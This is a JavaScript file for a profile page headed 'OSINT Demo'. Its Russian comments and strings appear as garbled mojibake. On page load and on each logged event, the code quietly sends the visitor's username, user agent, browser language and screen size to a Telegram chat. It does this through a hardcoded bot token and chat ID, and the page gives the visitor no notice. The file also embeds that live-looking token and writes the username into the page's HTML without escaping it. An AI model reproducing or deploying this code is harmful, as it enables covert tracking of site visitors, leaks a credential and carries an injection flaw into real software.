const BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
const CHAT_ID = '7408565938';

const logArea = document.getElementById('logArea');
const userDataList = document.getElementById('userDataList');
const profileForm = document.getElementById('profileForm');

let currentUser = null;
let logs = [];

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ª–æ–≥–æ–≤ –∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –∏—Ö –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
function addLog(text) {
  const time = new Date().toLocaleTimeString();
  const logEntry = `[${time}] ${text}`;
  logs.push(logEntry);
  if (logArea) {
    logArea.textContent = logs.join('\n');
  }
  sendToTelegram({ message: text });
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram —á–µ—Ä–µ–∑ Bot API
async function sendToTelegram(data) {
  let msg = `üïµÔ∏è OSINT Demo Log:\n`;
  if (data.message) msg += `‚Ä¢ –°–æ–±—ã—Ç–∏–µ: ${data.message}\n`;
  if (data.ip) msg += `‚Ä¢ IP: ${data.ip}\n`;
  if (data.userAgent) msg += `‚Ä¢ User-Agent: ${data.userAgent}\n`;
  if (data.language) msg += `‚Ä¢ –Ø–∑—ã–∫: ${data.language}\n`;
  if (data.screen) msg += `‚Ä¢ –≠–∫—Ä–∞–Ω: ${data.screen}\n`;
  if (data.username) msg += `‚Ä¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${data.username}\n`;
  if (data.extra) msg += `‚Ä¢ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: ${data.extra}\n`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });
  } catch (e) {
    console.warn('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram', e);
  }
}

// –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è / –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—á–µ—Ä–µ–∑ localStorage)
function registerUser(username) {
  currentUser = { username };
  localStorage.setItem('osintDemoUser', JSON.stringify(currentUser));
  addLog(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${username}`);
  renderUserProfile();
}

// –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ localStorage
function loadUser() {
  const stored = localStorage.getItem('osintDemoUser');
  if (stored) {
    currentUser = JSON.parse(stored);
    addLog(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–≥—Ä—É–∂–µ–Ω: ${currentUser.username}`);
  }
}

// –û—Ç–æ–±—Ä–∞–∑–∏—Ç—å –ø—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –¥–∞–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
function renderUserProfile() {
  if (!currentUser) return;
  if (profileForm) profileForm.username.value = currentUser.username;

  if (!userDataList) return;

  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screenSize = `${window.screen.width}x${window.screen.height}`;

  userDataList.innerHTML = `
    <li><b>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b> ${currentUser.username}</li>
    <li><b>User-Agent:</b> ${ua}</li>
    <li><b>–Ø–∑—ã–∫ –±—Ä–∞—É–∑–µ—Ä–∞:</b> ${lang}</li>
    <li><b>–†–∞–∑–º–µ—Ä —ç–∫—Ä–∞–Ω–∞:</b> ${screenSize}</li>
  `;

  // –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–æ–≤ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
  sendToTelegram({
    message: "–ü—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∑–∞–≥—Ä—É–∂–µ–Ω",
    username: currentUser.username,
    userAgent: ua,
    language: lang,
    screen: screenSize,
  });
}

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ñ–æ—Ä–º—ã –ø—Ä–æ—Ñ–∏–ª—è
if (profileForm) {
  profileForm.addEventListener('submit', e => {
    e.preventDefault();
    const username = profileForm.username.value.trim();
    if (username.length < 3) {
      alert('–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –º–µ–Ω–µ–µ 3 —Å–∏–º–≤–æ–ª–æ–≤');
      return;
    }
    registerUser(username);
  });
}

// –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('load', () => {
  loadUser();
  if (!currentUser) {
    alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å.');
    window.location.href = 'index.html';
  } else {
    renderUserProfile();
    addLog('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –ø—Ä–æ—Ñ–∏–ª—è');
  }
});
